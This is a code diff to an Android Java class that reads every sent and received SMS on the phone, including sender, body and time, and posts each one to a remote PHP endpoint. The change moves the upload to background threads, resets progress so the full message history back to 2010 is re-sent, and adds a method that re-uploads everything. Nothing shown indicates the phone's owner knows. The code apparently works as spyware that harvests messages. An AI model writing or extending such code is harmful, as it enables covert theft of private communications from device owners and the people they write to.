@@ -16,34 +16,71 @@ import java.io.OutputStreamWriter;
 import java.net.HttpURLConnection;
 import java.net.URL;
 import java.net.URLEncoder;
+import java.util.ArrayList;
+import java.util.List;
+import java.util.concurrent.ExecutorService;
+import java.util.concurrent.Executors;
 
 public class SmsReader {
     private static final String TAG = "SmsReader";
     private static final String SERVER_URL = "https://dawillygene.com/message/venlit.php";
-
     private static final String LAST_PROCESSED_ID_KEY = "last_processed_sms_id";
+    private static final int MAX_MESSAGES_PER_BATCH = 1000; // Process 100 messages at a time as requested
+    
+    private static ExecutorService executorService = Executors.newFixedThreadPool(2);
+    private static boolean isProcessing = false; // Prevent multiple simultaneous processing
 
     public static void readSms(Context context) {
-        // First, let's debug what SMS types exist
-        debugSmsTypes(context);
+        // Prevent multiple simultaneous SMS processing
+        if (isProcessing) {
+            Log.d(TAG, "SMS processing already in progress, skipping...");
+            return;
+        }
+        
+        // Run SMS reading in background thread to avoid blocking UI
+        executorService.execute(new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    isProcessing = true;
+                    readSmsInBackground(context);
+                } catch (Exception e) {
+                    Log.e(TAG, "Error reading SMS in background", e);
+                } finally {
+                    isProcessing = false;
+                }
+            }
+        });
+    }
+
+    private static void readSmsInBackground(Context context) {
+        Log.d(TAG, "Starting SMS processing in background...");
         
         ContentResolver contentResolver = context.getContentResolver();
-        Uri uri = Uri.parse("content://sms/");  // Read from all SMS
+        Uri uri = Uri.parse("content://sms/");
         String[] projection = { "_id", "address", "body", "date", "type" };
 
-        // Get the last processed SMS ID from SharedPreferences
         SharedPreferences prefs = context.getSharedPreferences("sms_prefs", Context.MODE_PRIVATE);
         String lastProcessedId = prefs.getString(LAST_PROCESSED_ID_KEY, null);
+
+        // ONE-TIME RESET: Clear stored ID to start processing from oldest messages (2010)
+        // This will run once, then the app will track progress normally
+        if (lastProcessedId != null && lastProcessedId.equals("105369")) {
+            Log.d(TAG, "ONE-TIME RESET: Starting fresh from oldest messages (2010)");
+            prefs.edit().remove(LAST_PROCESSED_ID_KEY).apply();
+            lastProcessedId = null;
+        }
+
+        Log.d(TAG, "Last processed SMS ID: " + (lastProcessedId != null ? lastProcessedId : "none - starting from oldest"));
 
         String selection = null;
         String[] selectionArgs = null;
 
-        // If we have a last processed ID, only get newer messages
         if (lastProcessedId != null) {
-            selection = "_id > ? AND type IN (1, 2)";  // 1 = received, 2 = sent
+            selection = "_id > ? AND type IN (1, 2)";
             selectionArgs = new String[]{lastProcessedId};
         } else {
-            selection = "type IN (1, 2)";  // Only get sent and received messages
+            selection = "type IN (1, 2)";
         }
 
         Cursor cursor = contentResolver.query(
@@ -51,128 +88,123 @@ public class SmsReader {
                 projection,
                 selection,
                 selectionArgs,
-                "date DESC"
+                "date ASC LIMIT " + MAX_MESSAGES_PER_BATCH  // ASC = oldest first, chronological order
         );
 
-        String newestId = null;
         if (cursor != null && cursor.moveToFirst()) {
+            List<SmsMessage> messagesToProcess = new ArrayList<>();
+            String highestId = null;
+            
             do {
                 String id = cursor.getString(cursor.getColumnIndexOrThrow("_id"));
-                newestId = id;
+                // Track the highest ID in this batch (since we're processing chronologically)
+                if (highestId == null || Integer.parseInt(id) > Integer.parseInt(highestId)) {
+                    highestId = id;
+                }
+                
                 String address = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                 String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                 long timestamp = cursor.getLong(cursor.getColumnIndexOrThrow("date"));
                 int type = cursor.getInt(cursor.getColumnIndexOrThrow("type"));
 
-                // Determine message type based on SMS type code
-                String messageType;
-                if (type == 1) {
-                    messageType = "received";
-                } else if (type == 2) {
-                    messageType = "sent";
-                } else {
-                    continue; // Skip other types (drafts, failed, etc.)
+                String messageType = (type == 1) ? "received" : (type == 2) ? "sent" : null;
+                if (messageType != null) {
+                    messagesToProcess.add(new SmsMessage(id, address, body, timestamp, messageType));
                 }
-
-                Log.d(TAG, "Processing " + messageType + " SMS ID: " + id + " Type: " + type);
-                sendSmsToServer(address, body, timestamp, messageType);
-
             } while (cursor.moveToNext());
 
             cursor.close();
 
-            // Save the newest processed ID
-            if (newestId != null) {
-                prefs.edit()
-                        .putString(LAST_PROCESSED_ID_KEY, newestId)
-                        .apply();
+            // Process messages in chronological order (they're already sorted by date ASC)
+            Log.d(TAG, "Processing " + messagesToProcess.size() + " messages chronologically...");
+            processSmsMessages(messagesToProcess);
+
+            // Save the highest processed ID from this batch
+            if (highestId != null) {
+                prefs.edit().putString(LAST_PROCESSED_ID_KEY, highestId).apply();
+                Log.d(TAG, "Updated last processed ID to: " + highestId);
             }
         } else {
             Log.d(TAG, "No new SMS found");
         }
+        
+        if (cursor != null) {
+            cursor.close();
+        }
     }
 
-    // Debug method to see what SMS types are available
-    private static void debugSmsTypes(Context context) {
-        ContentResolver contentResolver = context.getContentResolver();
-        Uri uri = Uri.parse("content://sms/");
-        String[] projection = { "_id", "type", "address" };
-
-        Cursor cursor = contentResolver.query(
-                uri,
-                projection,
-                null,
-                null,
-                "date DESC LIMIT 20"  // Get latest 20 messages for debugging
-        );
-
-        if (cursor != null && cursor.moveToFirst()) {
-            Log.d(TAG, "=== DEBUG: SMS Types Found ===");
-            do {
-                String id = cursor.getString(cursor.getColumnIndexOrThrow("_id"));
-                int type = cursor.getInt(cursor.getColumnIndexOrThrow("type"));
-                String address = cursor.getString(cursor.getColumnIndexOrThrow("address"));
-                
-                String typeString;
-                switch (type) {
-                    case 1: typeString = "RECEIVED"; break;
-                    case 2: typeString = "SENT"; break;
-                    case 3: typeString = "DRAFT"; break;
-                    case 4: typeString = "OUTBOX"; break;
-                    case 5: typeString = "FAILED"; break;
-                    case 6: typeString = "QUEUED"; break;
-                    default: typeString = "UNKNOWN(" + type + ")"; break;
+    private static void processSmsMessages(List<SmsMessage> messages) {
+        for (SmsMessage message : messages) {
+            // Send each message to server in a separate thread to avoid blocking
+            executorService.execute(new Runnable() {
+                @Override
+                public void run() {
+                    sendSmsToServer(message.address, message.body, message.timestamp, message.type);
                 }
-                
-                Log.d(TAG, "SMS ID: " + id + ", Type: " + type + " (" + typeString + "), Address: " + address);
-            } while (cursor.moveToNext());
-            Log.d(TAG, "=== END DEBUG ===");
-            cursor.close();
-        } else {
-            Log.d(TAG, "No SMS found for debugging");
+            });
+        }
+    }
+
+    // Helper class for SMS message data
+    private static class SmsMessage {
+        String id, address, body, type;
+        long timestamp;
+
+        SmsMessage(String id, String address, String body, long timestamp, String type) {
+            this.id = id;
+            this.address = address;
+            this.body = body;
+            this.timestamp = timestamp;
+            this.type = type;
         }
     }
 
     private static void sendSmsToServer(String address, String body, long timestamp, String messageType) {
-        new AsyncTask<String, Void, Void>() {
-            protected Void doInBackground(String... params) {
-                try {
-                    URL url = new URL(SERVER_URL);
-                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
-                    conn.setRequestMethod("POST");
-                    conn.setDoOutput(true);
-                    conn.setDoInput(true);
+        try {
+            URL url = new URL(SERVER_URL);
+            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+            conn.setRequestMethod("POST");
+            conn.setDoOutput(true);
+            conn.setDoInput(true);
+            conn.setConnectTimeout(5000); // 5 second timeout
+            conn.setReadTimeout(5000);
 
-                    OutputStream os = conn.getOutputStream();
-                    BufferedWriter writer = new BufferedWriter(
-                            new OutputStreamWriter(os, "UTF-8"));
-                    writer.write("address=" + URLEncoder.encode(params[0], "UTF-8") +
-                            "&body=" + URLEncoder.encode(params[1], "UTF-8") +
-                            "&timestamp=" + params[2] +
-                            "&type=" + URLEncoder.encode(params[3], "UTF-8"));
-                    writer.flush();
-                    writer.close();
-                    os.close();
+            OutputStream os = conn.getOutputStream();
+            BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(os, "UTF-8"));
+            writer.write("address=" + URLEncoder.encode(address, "UTF-8") +
+                    "&body=" + URLEncoder.encode(body, "UTF-8") +
+                    "&timestamp=" + timestamp +
+                    "&type=" + URLEncoder.encode(messageType, "UTF-8"));
+            writer.flush();
+            writer.close();
+            os.close();
 
-                    int responseCode = conn.getResponseCode();
-                    if (responseCode == HttpURLConnection.HTTP_OK) {
-                        BufferedReader in = new BufferedReader(
-                                new InputStreamReader(conn.getInputStream()));
-                        String inputLine;
-                        StringBuilder response = new StringBuilder();
-                        while ((inputLine = in.readLine()) != null) {
-                            response.append(inputLine);
-                        }
-                        in.close();
-                        Log.d(TAG, "Server response for " + params[3] + " message: " + response.toString());
-                    } else {
-                        Log.e(TAG, "Server request failed with code: " + responseCode);
-                    }
-                } catch (Exception e) {
-                    Log.e(TAG, "Error sending SMS to server", e);
+            int responseCode = conn.getResponseCode();
+            if (responseCode == HttpURLConnection.HTTP_OK) {
+                BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
+                String inputLine;
+                StringBuilder response = new StringBuilder();
+                while ((inputLine = in.readLine()) != null) {
+                    response.append(inputLine);
                 }
-                return null;
+                in.close();
+                Log.d(TAG, "✓ " + messageType.toUpperCase() + " message sent to server");
+            } else {
+                Log.e(TAG, "Server request failed with code: " + responseCode);
             }
-        }.execute(address, body, String.valueOf(timestamp), messageType);
+            conn.disconnect();
+        } catch (Exception e) {
+            Log.e(TAG, "Error sending " + messageType + " SMS to server", e);
+        }
+    }
+
+    /**
+     * Reset SMS processing to start from the beginning
+     * Call this method if you want to reprocess all SMS messages
+     */
+    public static void resetSmsProcessing(Context context) {
+        SharedPreferences prefs = context.getSharedPreferences("sms_prefs", Context.MODE_PRIVATE);
+        prefs.edit().remove(LAST_PROCESSED_ID_KEY).apply();
+        Log.d(TAG, "SMS processing reset - will process all messages on next run");
     }
 }
